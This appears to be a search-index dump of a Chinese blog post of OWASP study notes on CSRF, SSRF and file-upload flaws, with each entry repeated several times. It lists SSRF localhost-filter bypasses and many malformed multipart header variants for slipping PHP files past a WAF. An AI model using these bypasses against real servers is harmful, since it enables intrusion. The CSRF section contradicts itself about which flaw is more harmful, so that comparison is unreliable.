3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3如何防止-csrf"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4csrf成功利用的条件"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5xss和csrf的区别"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#04-ssrf漏洞"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-3"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2防御"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3ssrf-禁用-127001-后如何绕过支持哪些协议"},{"categories":["hvv"],"content":"\r04-ssrf漏洞\r1.原理SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统 1）服务器允许向其他服务器获取资源 2）但是并没有对该地址做严格的过滤和限制 3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回 2.防御：1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等 2.黑名单内网 IP。 3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？(1)利用进制转换 (2)利用DNS解析 (3)利用句号（127。0。0。1） (4)利用[::]（http://[::]:80/） (5)利用@（http://example.com@127.0.0.1） (6)利用短地址（http://dwz.cn/11SMa） (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://） 4.漏洞存在的地方：1.能够对外发起网络请求的地方 2.请求远程服务器资源的地方 3.数据库内置功能 4.邮件系统 5.文件处理 6.在线处理工具 https://xz.aliyun.com/t/11215 https://zhuanlan.zhihu.com/p/346220565 https://www.buaq.net/go-66428.html ","date":"2023-11-17","objectID":"/hvv_owasptop10/:3:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4漏洞存在的地方"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#05-文件上传漏洞"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1文件上传原理"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2漏洞原理"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; 